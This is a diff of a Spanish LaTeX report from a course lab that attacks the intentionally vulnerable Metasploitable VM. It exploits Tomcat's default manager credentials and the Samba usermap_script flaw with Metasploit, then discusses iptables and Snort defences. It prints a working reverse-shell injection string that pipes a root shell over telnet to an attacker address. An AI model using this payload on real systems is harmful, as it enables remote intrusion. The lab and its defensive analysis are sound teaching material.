@@ -46,7 +46,7 @@ Informe de seguridad sobre Metasploit, mostrando los riesgos para el sistema y m
 
 \section{Introducción}
 
-%TODO: Indicar que además de servicios inseguros habría que estudiar la seguridad del edificio,
+% DONE TODO: Indicar que además de servicios inseguros habría que estudiar la seguridad del edificio,
 % cableado, puertas, guardias de seguridad, etc...
 
 En este informe describimos una serie de ataques sobre un sistema inseguro, Metasploitable, que tendrá el rol de víctima, desde una máquina en una red externa, el atacante. Inicialmente mostraremos los ataques con éxito, donde no hay (suficientes) medidas de seguridad. Después describiremos las medidas de seguridad software que debería tomar la organización en su red para poder detectar y evitar en la medida de lo posible dichos ataques.
@@ -55,12 +55,33 @@ En cuanto a la seguridad física, dependiendo del caso real en que nos encontrem
 
 \section{Topología del sistema}
 
-%TODO: añadir esquema de la topología ideal
+% DONE TODO: añadir esquema de la topología ideal
+
+\includegraphics[width=1\linewidth]{topoideal.png}
+
+
+Idealmente existe un servidor, la víctima, conectado a Internet desde una organización con su Router, Firewall, IDS e IPS; y en el otro extremo, en cualquier parte de Internet, un atacante. El objetivo del atacante es aprovechar los servicios accesibles desde Internet de la víctima para conseguir ejecución arbitraria de código de manera remota.
+
+Otro tipo de ataque podría consistir en acceder a otra máquina víctima 2 de la red, remota o físicamente, y atacar desde dentro de la propia red de la organización, con la posibilidad de saltar (según su configuración) el FW/IDS.
+
+El ataque más agresivo sería conseguir un acceso físico a la máquina víctima.
 
 \subsection{Topología real}
 
-%TODO: añadir esquema de topología virtual
-%TODO: indicar topología sin protección
+% DONE TODO: añadir esquema de topología virtual
+% DONE TODO: indicar topología sin protección
+
+Por simplicidad, y por la naturaleza de máquina virtual de nuestra víctima, Metasploitable, la topología real desplegada consiste en la máquina anfitrión y la máquina virtual conectados por una interfaz virtual, entre las cuales se situarán el FW y el IDS.
+
+Aunque el ataque entonces sería desde la misma red de la víctima, no perdemos generalidad, pues los elementos problemáticos cuando se ataca desde Internet, siguen estando en medio de la comunicación.
+
+\includegraphics[width=1\linewidth]{toporeal.png}
+
+
+Como indicábamos en la introducción, inicialmente trataremos sin SNORT ni IPtables los ataques, por lo que la comunicación será directa hacia Metasploitable.
+
+Conocemos ya su IP, que en un caso real, primero buscaríamos por su nombre de dominio las entradas del DNS que nos dieran las IPs de los servidores en la organización y los posibles servicios que ofrecen según el tipo de entrada y nombre. Como no tenemos DNS, partimos de que conocemos la IP de la máquina víctima.
+
 
 \section{Metasploitable}
 
@@ -74,9 +95,6 @@ La VM de Metasploitable viene preparada para usarse con VMWare o VirtualBox, y s
 
 Para hacerlo lo más realista posible, no vamos hacer login en el sistema de Metasploitable, y tampoco vamos a asumir que conocemos el login y el password (msfadmin:msfadmin), que son cosas que en un escenario real no sabríamos.
 
-\section{Servicios inseguros}
-
-%TODO: indicar sin protección
 
 \subsection{Primera toma de contacto}
 
@@ -204,7 +222,8 @@ Para vulnerar estos servicios hacemos uso de Metasploit, un software de código 
 
 \subsection{Tomcat}
 
-%TODO: ¿Qué es tomcat?
+Tomcat es un servidor OpenSource de Apache para programar el servicio web en Java. Ya tratamos con él en Programación Para las Comunicaciones, y ahora intentaremos atacarlo.
+
 
 Como indicamos anteriormente usaremos metasploit para intentar vulnerar Tomcat. Si buscamos Tomcat en la bases de datos de metasploit:
 
@@ -299,8 +318,8 @@ Server username: tomcat55
 La teoría detrás de la ejecución arbitraria de código como usuario autenticado en el Tomcat Manager se puede encontrar en los siguientes enlaces:
 
 \begin{itemize}
-	\item \hyperref{https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload}{rapid7}{tomcat}{Rapid7, información del exploit en metasploit.}
-	\item \hyperref{http://tomcat.apache.org/tomcat-5.5-doc/manager-howto.html#Deploy_A_New_Application_Remotely}{tomcat}{uploadwar}{Cómo subir aplicaciones remotamente a Tomcat 5.5}.
+	\item \hyperref{https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload}{rapid7}{tomcat}{\underline{Rapid7, información del exploit en metasploit.}}
+	\item \hyperref{http://tomcat.apache.org/tomcat-5.5-doc/manager-howto.html#Deploy_A_New_Application_Remotely}{tomcat}{uploadwar}{\underline{Cómo subir aplicaciones remotamente a Tomcat 5.5}}.
 \end{itemize}
 
 Más que un error en Tomcat, es un error en su configuración, que trae un usuario por defecto, y lo usamos para explotar una funcionalidad que trae Tomcat y que debería ser segura. 
@@ -329,7 +348,7 @@ Con la cabecera \textbf{Authorization: Basic dg9tY2F0OnRvbWNhdA==}\footnote{En b
 
 \begin{center}
 	\includegraphics[width=1\linewidth]{cap3-1}
-	Truncamos parte del payload.
+	[Payload truncado]
 \end{center}
 \begin{center}
 	\includegraphics[width=1\linewidth]{cap3-2}
@@ -343,10 +362,10 @@ Con la cabecera \textbf{Authorization: Basic dg9tY2F0OnRvbWNhdA==}\footnote{En b
 \end{center}
 \begin{center}
 	\includegraphics[width=1\linewidth]{cap4-2}
-	Mismo paso que en la página anterior, solo que aquí si va la cabecera \textit{Authorization}. A partir de aquí el payload está subido, y se puede ejecutar para obtener una sesión de meterpreter. 
+	Mismo paso que en la página anterior, solo que aquí sí va la cabecera \textit{Authorization}. A partir de aquí el payload está subido, y se puede ejecutar para obtener una sesión de meterpreter. 
 \end{center}
 
-No analizamos las trazas de la sesión meterpreter porque no viajan en formato humanamente legible. Probablemente viaje código serializado en Java para la máquina virtual en Tomcat. Sin embargo, sí que analizamos el saludo a 3 pasos de la conexión TCP de la sesión:
+No analizamos las trazas de la sesión meterpreter porque no viajan en un formato humanamente legible. Probablemente viaje código serializado en Java para la máquina virtual en Tomcat. Sin embargo, sí que analizamos el saludo a 3 pasos de la conexión TCP de la sesión:
 
 \newpage
 
@@ -357,9 +376,11 @@ No analizamos las trazas de la sesión meterpreter porque no viajan en formato h
 
 \subsection{Samba}
 
-%TODO: ¿Qué es samba?
+Samba es la implementación libre de SMB (ahora llamado CIFS) de Windows para UNIX, en resumen, un protocolo de compartición de archivos en red, independiente de la plataforma y muy extendido.
 
 Si realizamos el mismo proceso con Samba que con Tomcat, empezaríamos buscando en la base de datos de Metasploit herramientas relacionadas con samba, empezando por los escáneres. Sin embargo, de los escáneres de Samba no hemos obtenido ningún dato relevante como sucedió con Tomcat. Después de probar varias herramientas\footnote{Se puede hacer búsqueda con \textbf{search smb} y \textbf{search samba}}, damos con una que nos permite la ejecución arbitraria de código, ¡como root!
+
+%TODO: poner salidas de nmap donde al menos salga la versión del SW
 
 \begin{lstlisting}[breaklines]
 > use exploit/multi/samba/usermap_script 
@@ -387,7 +408,7 @@ Si buscamos acerca del exploit que permite esto, encontramos lo siguiente:
 
 \vspace{10pt}
 
-This module exploits a command execution vulerability in Samba versions 3.0.20 through 3.0.25rc3 when using the non-default "username map script" configuration option. By specifying a username containing shell meta characters, attackers can execute arbitrary commands. No authentication is needed to exploit this vulnerability since this option is used to map usernames prior to authentication!\cite{rapid7-userscriptsamba}
+\textit{This module exploits a command execution vulerability in Samba versions 3.0.20 through 3.0.25rc3 when using the non-default ``username map script'' configuration option. By specifying a username containing shell meta characters, attackers can execute arbitrary commands. No authentication is needed to exploit this vulnerability since this option is used to map usernames prior to authentication!\cite{rapid7-userscriptsamba}}
 
 \vspace{10pt}
 
@@ -400,11 +421,16 @@ En la descripción previa de Rapid7 hay información suficiente para intentar de
 
 Vemos que usa en el campo usuario el siguiente texto:
 
+\hfill
+
 \begin{lstlisting}[breaklines]
 /=`nohup sh -c '(sleep 3870|telnet 192.168.59.1 4444|while : ; do sh && break; done 2>&1|telnet 192.168.59.1 4444 >/dev/null 2>&1 &)'`
 \end{lstlisting}
 
+\hfill
+
 %TODO: Latex no imprime bien las comillas 
+%No hay manera cómoda de apañarlo estando dentro del lstlisting
 
 Ese usuario introduciría una orden como el usuario que controla Samba para conectar una terminal sh a un servidor de telnet alojado en la máquina atacante puerto 4444. Como samba está controlado por root, la terminal que se ejecuta tiene id=0, permitiendo el nivel máximo de administración. Este fallo estaría clasificado como Injection (aunque no SQL).
 
@@ -420,19 +446,21 @@ Recordamos que, al igual que con Tomcat, la orden \textbf{telnet 192.168.59.1 44
 
 En lo siguiente, vamos a indicar como detectar y/o prevenir los ataques anteriores y posiblemente algún otro ataque similar.
 
-%TODO: tomcat debería cambiar el usuario por defecto ffs.
+
+La medida más obvia es no dejar las contraseñas por defecto (ni usar inseguras fácilmente atacables por diccionario) en ninguno de los servicios.
+
 
 \vspace{10pt}
 
-Como los ataques usan internet como vector de transmisión, centraremos el esfuerzo en filtrar e inspeccionar paquetes que viajan por la red, aunque no es la única forma de intrusión (por ejemplo, a través de USB) es la más común (todos los dispositivos actuales hacen uso de internet).
+Como los ataques usan Internet como vector de transmisión, centraremos el esfuerzo en filtrar e inspeccionar paquetes que viajan por la red, aunque no es la única forma de intrusión (por ejemplo, a través de USB) es la más común (todos los dispositivos actuales hacen uso de Internet).
 
 \subsection{Firewall - iptables}
 
-Como hemos visto en los dos ataques a Tomcat y Samba, los \textit{payloads} suelen conectarse al atacante. Desde un punto de vista TCP, el que escucha a un puerto es el atacante, y la parte que inicia con SYN es la víctima. 
+Como hemos visto en los dos ataques a Tomcat y Samba, los \textit{payloads} suelen conectarse a la máquina atacante para recibir operaciones más complejas. Desde un punto de vista TCP, el que escucha a un puerto es el atacante, y la parte que inicia con SYN es la víctima. 
 
 \vspace{10pt}
 
-Bloquear las conexiones salientes en un servidor evitaría este tipo de ejecuciones remotas. En un servidor bloquear las conexiones salientes no debería ser un problema, ya que deberían estar escuchando para ofrecer servicios, y salvo excepciones muy concretas (conexiones a servidores de datos ajenos, por ejemplo) podemos filtrar todas las conexiones salientes.
+Bloquear las conexiones salientes en un servidor evitaría este tipo de ejecuciones remotas. En un servidor bloquear las conexiones TCP salientes (iniciadas por el servidor) no debería ser un problema, ya que sólo debería estar escuchando para ofrecer servicios, y salvo excepciones muy concretas (conexiones a servicios de datos externos, por ejemplo) podemos filtrar todas las conexiones salientes.
 
 \vspace{10pt}
 
@@ -442,9 +470,11 @@ Bloquear las conexiones salientes en un servidor evitaría este tipo de ejecucio
 iptables -A OUTPUT -p tcp -m multiport -m tcp -m state --state NEW --sports 1025:65535 -j DROP
 \end{lstlisting}
 
+\textit{Bloquear todas las nuevas conexiones TCP salientes al rango de puertos 1025 a 65535.}
+
 \vspace{10pt}
 
-Cabe destacar que estas iptables solo se lo ponen más difícil al atacante para obtener información; no bloquean la ejecución arbitraria de código, pero sí dejan al atacante sin saber nada del otro extremo. Por ejemplo, no podría obtener información a través de cat, ls, ps, etc... Por otro lado, como Samba User Script Map permite la ejecución de código arbitrario con id=0, el atacante podría añadir una regla ACCEPT a un puerto en concreto en las iptables para hacer una conexión concreta, así que solo nos protegería parcialmente.
+Cabe destacar que estas iptables solo se lo ponen más difícil al atacante para obtener información, y según el caso real se pueden refinar mucho más; no bloquean la ejecución arbitraria de código, pero sí dejan al atacante sin saber nada del otro extremo si no utiliza puertos restringidos en su máquina. Por ejemplo, no podría obtener información a través de cat, ls, ps, etc... Por otro lado, como Samba User Script Map permite la ejecución de código arbitrario con id=0, el atacante podría añadir una regla ACCEPT a un puerto en concreto en las iptables para hacer una conexión concreta, así que solo nos protegería parcialmente. Es un pequeño parche frente a los sploits \textit{de manual} ya escritos y primeramente usados.
 
 \vspace{10pt}
 
@@ -471,15 +501,28 @@ Podríamos bloquear con iptables los servicios Samba y Tomcat, pero eso equivale
 [*] Exploit completed, but no session was created.
 \end{verbatim}
 
-Algo va mal, no se ha creado ninguna sesión, debido a que las conexiones salientes nuevas no se admiten. Repetimos que esto solo previene parte del ataque.
+Algo va mal, no se ha creado ninguna sesión, debido a que las conexiones salientes nuevas no se admiten. Repetimos que esto solo previene parte del ataque, pero el atacante debe entonces \textit{adivinar} qué bloqueo existe y cómo saltarlo.
 
 \subsection{Predicción de ataques - Snort}
 
-%TODO: ¿Qué es snort?
+%TODO: ¿Qué es snort?   nah'
 
+
+%TODO: poner la configuración de SNORT de /etc/snort/snort.conf y explicar señalar qué dirección es del anfitrión, que sería de la red externa, y qué dirección es de la mv, que sería la subred home
+
+%TODO: poner la orden que se usa en el anfitrión e indicar de nuevo lo que es característico de nuestra topología simplificada (interfaz vboxnet0)
+
+
+%ADD ? preprocessor sfportscan:
 
 %TODO: revisar esta sección
-En la sección anterior hemos visto trozos de trazas en Wireshark que nos pueden servir de firmas para detectar ataques. Podemos configurar snort para que avise de ciertos patrones en intercambios de información a través de la red. También podría actuar en base a ciertas reglas, como bloqueando el tráfico, instalando nuevas iptables, reiniciando la máquina, etc..., aunque se recomienda no hacerlo porque podrían atacantes mandar tráfico para activar esas órdenes. 
+En la sección anterior hemos visto trozos de trazas en Wireshark que nos pueden servir de firmas para detectar ataques. Podemos configurar Snort para que avise de ciertos patrones en intercambios de información a través de la red. También podría actuar en base a ciertas reglas, como bloqueando el tráfico, instalando nuevas iptables, reiniciando la máquina, etc..., aunque se recomienda no hacerlo porque podrían atacantes mandar tráfico para activar esas órdenes.
+
+%Texto alternativo:
+
+Con Snort podemos buscar \textit{firmas} representativas en los mensajes de ciertos ataques, para poder detectarlos, e incluso aplicar acciones (instalar nuevas iptables, guardar logs y reiniciar servicios, etc.), aunque no se recomienda para evitar que se conviertan en nuevos modo de ataque (como una denegación de servicio donde el servidor web se aísla ante la detección de un ataque, y deja sin servicio a los usuarios). En las trazas de Wireshark analizadas hemos destacado ciertas cadenas que aparecen por ser parte del propio ataque, lo que nos pueden servir de \textit{firmas} en Snort.
+
+ 
 
 %TODO: Snort para detectar nmap
 
@@ -491,9 +534,20 @@ Si repetimos las pruebas (desactivando iptables) snort reacciona de la siguiente
 
 %TODO: repetir pruebas SIN iptables pero con snort
 
+
+
 \section{Conclusiones}
 
-%TODO: jl rellena pls
+%TODO: jl rellena pls : posok
+
+%Cosas a poner:
+% El uso de mv y host frente al proyecto LEGO. 
+% Que LEGO durante la explicación es muy útil, pues te da la perspectiva correcta de qué está ocurriendo, pero luego a la hora de trabajar con las herramientas importantes (MS, Snort, nmap, nessus), es más importante tener dos máquinas donde usar las herramientas que el tener una infraestructura compleja de montar que te da lo mismo.
+% Memes
+%
+
+
+
 
 \bibliographystyle{amsplain}
 \bibliography{memoria}
